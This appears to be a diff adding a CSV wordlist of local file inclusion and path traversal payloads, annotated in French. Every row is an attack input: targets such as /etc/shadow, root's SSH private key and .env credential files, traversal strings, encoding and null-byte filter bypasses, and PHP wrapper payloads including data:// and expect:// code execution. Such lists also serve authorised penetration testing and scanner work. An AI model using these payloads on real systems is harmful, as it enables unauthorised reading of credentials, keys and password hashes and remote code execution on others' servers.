@@ -1,0 +1,60 @@
+payload,description
+/etc/passwd,Linux — comptes utilisateurs
+/etc/shadow,Linux — hash mots de passe (root)
+/etc/hosts,Linux — table DNS locale
+/etc/hostname,Linux — nom de la machine
+/etc/os-release,Linux — info distribution
+/etc/crontab,Linux — tâches planifiées système
+/var/spool/cron/crontabs/root,Linux — cron root
+/proc/self/environ,Linux — variables d'environnement process
+/proc/self/cmdline,Linux — ligne de commande du process
+/proc/self/fd/0,Linux — stdin du process courant
+/proc/version,Linux — version kernel
+/proc/net/tcp,Linux — connexions TCP actives
+/root/.bash_history,Linux — historique bash root
+/home/www-data/.bash_history,Linux — historique bash www-data
+/root/.ssh/id_rsa,Linux — clé SSH privée root
+/root/.ssh/authorized_keys,Linux — clés SSH autorisées root
+/var/log/apache2/access.log,Apache — log accès (LFI→RCE via log poisoning)
+/var/log/apache2/error.log,Apache — log erreurs
+/var/log/nginx/access.log,Nginx — log accès
+/var/log/nginx/error.log,Nginx — log erreurs
+/var/log/auth.log,Linux — log authentification SSH
+/var/log/syslog,Linux — syslog système
+/var/log/mail.log,Linux — log serveur mail
+/etc/apache2/apache2.conf,Apache — config principale
+/etc/nginx/nginx.conf,Nginx — config principale
+/etc/php/7.4/apache2/php.ini,PHP — config (version 7.4)
+/etc/mysql/my.cnf,MySQL — config
+/var/www/html/config.php,PHP — fichier de config courant
+/var/www/html/.env,Laravel/Django — variables d'env (creds)
+../etc/passwd,Traversal 1 niveau — /etc/passwd
+../../etc/passwd,Traversal 2 niveaux
+../../../etc/passwd,Traversal 3 niveaux
+../../../../etc/passwd,Traversal 4 niveaux
+../../../../../etc/passwd,Traversal 5 niveaux
+../../../../../../etc/passwd,Traversal 6 niveaux
+../../../../../../../etc/passwd,Traversal 7 niveaux
+../../../../../../../../etc/passwd,Traversal 8 niveaux
+....//....//....//etc/passwd,Bypass filtre ../ — double point-slash
+..%2F..%2F..%2Fetc%2Fpasswd,URL encoding %2F
+..%252F..%252F..%252Fetc%252Fpasswd,Double URL encoding %25
+%2e%2e%2f%2e%2e%2fetc%2fpasswd,URL encoding complète
+..%c0%af..%c0%afetc%c0%afpasswd,UTF-8 overlong encoding
+/etc/passwd%00,Null byte injection (PHP<5.3)
+....//....//etc/passwd,Double slash traversal
+php://filter/convert.base64-encode/resource=/etc/passwd,PHP wrapper base64 — lire /etc/passwd
+php://filter/convert.base64-encode/resource=index.php,PHP wrapper base64 — lire index.php
+php://filter/read=string.rot13/resource=/etc/passwd,PHP wrapper ROT13
+php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd,PHP wrapper iconv
+php://input,PHP wrapper input — exec corps POST
+"data://text/plain,<?php system('id'); ?>",PHP data:// wrapper RCE
+"data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",PHP data:// wrapper base64 RCE
+expect://id,PHP expect:// wrapper RCE (si activé)
+zip://shell.jpg%23payload.php,PHP zip:// wrapper (upload zip)
+C:\windows\system32\drivers\etc\hosts,Windows — hosts file
+C:\windows\win.ini,Windows — win.ini
+C:\windows\system32\config\SAM,Windows — SAM (hash comptes)
+C:\inetpub\wwwroot\web.config,IIS — web.config
+../windows/win.ini,Windows traversal — win.ini
+..\..\..\windows\win.ini,Windows backslash traversal
